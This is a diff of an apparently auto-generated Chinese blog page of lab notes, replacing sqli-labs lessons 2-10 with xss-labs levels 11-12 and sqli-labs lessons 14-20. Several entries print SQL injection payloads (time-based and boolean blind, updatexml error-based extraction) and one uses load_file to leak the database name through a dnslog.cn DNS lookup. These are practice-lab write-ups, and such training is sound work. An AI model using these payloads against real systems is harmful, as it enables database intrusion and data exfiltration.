@@ -64,10 +64,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-10" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第12关" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-10/" class="article-date">
-  <time datetime="2022-03-31T15:16:56.296Z" itemprop="datePublished">2022-03-31</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC12%E5%85%B3/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.911Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-10/">sqli-labs-less-10</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC12%E5%85%B3/">xss-labs第12关</a>
     </h1>
   
 
@@ -86,13 +86,16 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>注入语句：id=1” and if(length(database())&gt;7 ,sleep(5),1) –+</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson10/1.png"></p>
+        <p>1.根据返回的html判断user-agent字段为web页面的自定义变量，可能存在xss注入点</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC12%E5%85%B3/1.png"></p>
+<p>2.进行测试，存在xss注入</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC12%E5%85%B3/2.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC12%E5%85%B3/3.png"> 3.后台源代码分析，获取get请求的keyword、t_sort变量和user-agent字段，过滤refer字段的尖括号后输出在html代码中</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-10/" data-id="cl1f7n02a0002q4tr0nlig9xy" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC12%E5%85%B3/" data-id="cl27ltdnj0002f0tr5lm4hbme" class="article-share-link">Share</a>
       
       
     </footer>
@@ -102,10 +105,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-9" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第11关" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-9/" class="article-date">
-  <time datetime="2022-03-31T15:15:42.396Z" itemprop="datePublished">2022-03-31</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC11%E5%85%B3/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.909Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -116,7 +119,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-9/">sqli-labs-less-9</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC11%E5%85%B3/">xss-labs第11关</a>
     </h1>
   
 
@@ -124,16 +127,17 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>注入语句：id=1’ and if(length(database())&gt;3 ,sleep(5),1) –+</p>
-<p>因为不知道数据库名是几个字母，所以先让数字大于3进行判断，然后依次增加。</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson9/1.png"></p>
-<p>如果sleep函数不起作用了，说明数据库名可能等于这个数。这时就能判断它的数据库名了。</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson9/2.png"></p>
+        <p>1.根据返回的html判断refer字段为web页面的自定义变量，可能存在xss注入点</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC11%E5%85%B3/1.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC11%E5%85%B3/2.png"></p>
+<p>2.进行测试，存在xss注入</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC11%E5%85%B3/3.png"></p>
+<p>3.后台源代码分析，获取get请求的keyword、t_sort变量和refer字段，过滤refer字段的尖括号后输出在html代码中</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-9/" data-id="cl1f7n02j000gq4tr8k9j30cj" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC11%E5%85%B3/" data-id="cl27ltdnh0001f0trey623z0w" class="article-share-link">Share</a>
       
       
     </footer>
@@ -143,10 +147,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-8" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-18" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-8/" class="article-date">
-  <time datetime="2022-03-31T15:13:30.447Z" itemprop="datePublished">2022-03-31</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/" class="article-date">
+  <time datetime="2022-03-31T16:27:15.802Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -157,7 +161,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-8/">sqli-labs-less-8</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/">sqli-labs-less-18</a>
     </h1>
   
 
@@ -165,17 +169,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>布尔型盲注，单引号，id=1回显，价格单引号不回显，构造一下验证是不是布尔型payload ?id=1’ and 1=1 –+ 回显了</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson8/1.png"></p>
-<p>爆破库</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson8/2.png"></p>
-<p>库名长度可使用?id=1’ and length(database())=8–+ 判断，同理表名字，段名等。</p>
-<p>最后得到库名?id=1’ and left((select database()),8)=’security’–+</p>
+        <p>注入语句：’,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson18/1.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson18/2.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson18/3.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-8/" data-id="cl1f7n02i000eq4trc1dcbklj" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/" data-id="cl1f7n02d0008q4tr2a2e5lc8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -185,10 +187,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-7" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-17" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-7/" class="article-date">
-  <time datetime="2022-03-31T15:09:07.726Z" itemprop="datePublished">2022-03-31</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/" class="article-date">
+  <time datetime="2022-03-31T16:27:15.800Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -199,7 +201,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-7/">sqli-labs-less-7</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/">sqli-labs-less-17</a>
     </h1>
   
 
@@ -207,13 +209,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson7/1.png"></p>
-<p>php文件没出来。。。</p>
+        <p>注入语句：’ and (updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson17/2.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson17/3.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-7/" data-id="cl1f7n02j000fq4tr4xzuhdbe" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/" data-id="cl1f7n02d0007q4tr6ly78b61" class="article-share-link">Share</a>
       
       
     </footer>
@@ -223,10 +226,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-6" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-16" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-6/" class="article-date">
-  <time datetime="2022-03-31T15:07:08.923Z" itemprop="datePublished">2022-03-31</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/" class="article-date">
+  <time datetime="2022-03-31T16:27:15.799Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -237,7 +240,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-6/">sqli-labs-less-6</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/">sqli-labs-less-16</a>
     </h1>
   
 
@@ -245,13 +248,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p> 双引号字符型注入，上一题的单引号改成双引号就可以了,同样是两种方法：时间延迟型的手工盲注、报错型的手工盲注或者sqlmap，再有利用concat()几聚合数。</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson6/1.png"></p>
+        <p>注入语句：admin”) and 1=1 – -</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson16/1.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-6/" data-id="cl1f7n02i000dq4trfsk99rlp" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/" data-id="cl1f7n02c0006q4tr5z70eada" class="article-share-link">Share</a>
       
       
     </footer>
@@ -261,10 +264,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-5" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-15" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-5/" class="article-date">
-  <time datetime="2022-03-31T15:03:20.215Z" itemprop="datePublished">2022-03-31</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/" class="article-date">
+  <time datetime="2022-03-31T16:27:15.796Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -275,7 +278,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-5/">sqli-labs-less-5</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/">sqli-labs-less-15</a>
     </h1>
   
 
@@ -283,17 +286,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson5/1.png"></p>
-<p>看到这个报错信息，第一反应就是布尔型盲注、报错型注入、时间延迟型盲注了</p>
-<p>下面给出验证时间延迟型的盲注：</p>
-<p><a target="_blank" rel="noopener" href="http://45.32.113.109:40430/Less-5/?id=1&#39;">http://45.32.113.109:40430/Less-5/?id=1&#39;</a> and sleep(5) –+</p>
-<p>发现明显延迟，说明猜测正确。接下来的思路是通过延迟，依次爆破数据库长度，数据库名，表名，列名，以及字段。</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson5/2.png"></p>
+        <p>注入语句：admin’ and load_file(concat(“\\“,(database()),”.qyfyji.dnslog.cn\1.txt”)) –+</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson15/1.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-5/" data-id="cl1f7n02h000cq4tr94t29456" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/" data-id="cl1f7n02c0005q4tr1ra08zxl" class="article-share-link">Share</a>
       
       
     </footer>
@@ -303,10 +302,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-4" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-14" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-4/" class="article-date">
-  <time datetime="2022-03-31T14:58:44.180Z" itemprop="datePublished">2022-03-31</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/" class="article-date">
+  <time datetime="2022-03-31T16:27:15.795Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -317,7 +316,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-4/">sqli-labs-less-4</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/">sqli-labs-less-14</a>
     </h1>
   
 
@@ -325,13 +324,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>输入单引号，页面无任何变化，输入双引号，页面报错，根据报错信息判断出输入的内容被放到一队双引号和圆括号中</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson4/1.png"></p>
+        <p>注入语句：admin” union select updatexml(1,concat(0x7e,(select user()),0x7e),1) –+</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson14/1.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-4/" data-id="cl1f7n02h000bq4tr1jyph730" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/" data-id="cl1f7n0280001q4trhnpo97ar" class="article-share-link">Share</a>
       
       
     </footer>
@@ -341,10 +340,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-3" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-20" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-3/" class="article-date">
-  <time datetime="2022-03-24T16:22:17.958Z" itemprop="datePublished">2022-03-25</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-20/" class="article-date">
+  <time datetime="2022-03-31T16:27:13.754Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -355,7 +354,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-3/">sqli-labs less 3</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-20/">sqli-labs-less-20</a>
     </h1>
   
 
@@ -363,35 +362,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>1.查看回显</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/1.png" alt="1.png (1255×625) (raw.githubusercontent.com)"></p>
-<p>2.判断闭合符号</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/2.png" alt="2.png (1254×626) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/3.png" alt="3.png (1255×666) (raw.githubusercontent.com)"></p>
-<p>单引号报错，双引号显示正常，从回显信息看，是由‘）进行闭合的，所以尝试’）</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/4.png" alt="4.png (1253×625) (raw.githubusercontent.com)"></p>
-<p>显示正常，所以参数是‘）进行闭合的。</p>
-<p>3.判断注入类型</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/5.png" alt="5.png (1254×619) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/6.png" alt="6.png (1254×617) (raw.githubusercontent.com)"></p>
-<p>4.判断列数</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/7.png" alt="7.png (1253×619) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/8.png" alt="8.png (1255×622) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/9.png" alt="9.png (1256×626) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/10.png" alt="10.png (1254×628) (raw.githubusercontent.com)"></p>
-<p>5.爆破数据库</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/11.png" alt="11.png (1257×623) (raw.githubusercontent.com)"></p>
-<p>6.爆破数据表/查询表名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/12.png" alt="12.png (1251×618) (raw.githubusercontent.com)"></p>
-<p>7.爆破字段/查询列名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/13.png" alt="13.png (1133×614) (raw.githubusercontent.com)"></p>
-<p>8.爆破值/查询数据</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/14.png" alt="14.png (1130×624) (raw.githubusercontent.com)"></p>
-
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-3/" data-id="cl157fhht00027gtrgpgobi0a" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-20/" data-id="cl1f7n02g000aq4tr1gx6707n" class="article-share-link">Share</a>
       
       
     </footer>
@@ -401,10 +376,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-2" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-19" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-2/" class="article-date">
-  <time datetime="2022-03-24T16:22:17.955Z" itemprop="datePublished">2022-03-25</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-19/" class="article-date">
+  <time datetime="2022-03-31T16:27:13.753Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -415,7 +390,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-2/">sqli-labs less 2</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-19/">sqli-labs-less-19</a>
     </h1>
   
 
@@ -423,31 +398,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>1.判断闭合符号</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/1.png" alt="1.png (1134×622) (raw.githubusercontent.com)"></p>
-<p>2.判断类型</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/2.png" alt="2.png (1131×620) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/3.png" alt="3.png (1131×620) (raw.githubusercontent.com)"></p>
-<p>可知是整型，不必再添加必和符号。</p>
-<p>3.判断列数</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/4.png" alt="4.png (1138×622) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/5.png" alt="5.png (1133×620) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/6.png" alt="6.png (1137×629) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/7.png" alt="7.png (1131×625) (raw.githubusercontent.com)"></p>
-<p>可知列数为3</p>
-<p>4.爆破数据库</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/8.png" alt="8.png (1136×623) (raw.githubusercontent.com)"></p>
-<p>5.爆破数据表/查询表名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/9.png" alt="9.png (1131×618) (raw.githubusercontent.com)"></p>
-<p>6.爆破字段/查询列名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/10.png" alt="10.png (1153×625) (raw.githubusercontent.com)"></p>
-<p>7.爆破值/查询数据</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/11.png" alt="11.png (1920×883) (raw.githubusercontent.com)"></p>
+        <p>注入语句： ‘,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson19/1.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson19/2.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson19/3.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-2/" data-id="cl157fhhs00017gtr6he8f1c6" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-19/" data-id="cl1f7n02f0009q4tr46bt5f8b" class="article-share-link">Share</a>
       
       
     </footer>
@@ -457,10 +416,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-1" class="article article-type-post" itemscope itemprop="blogPost">
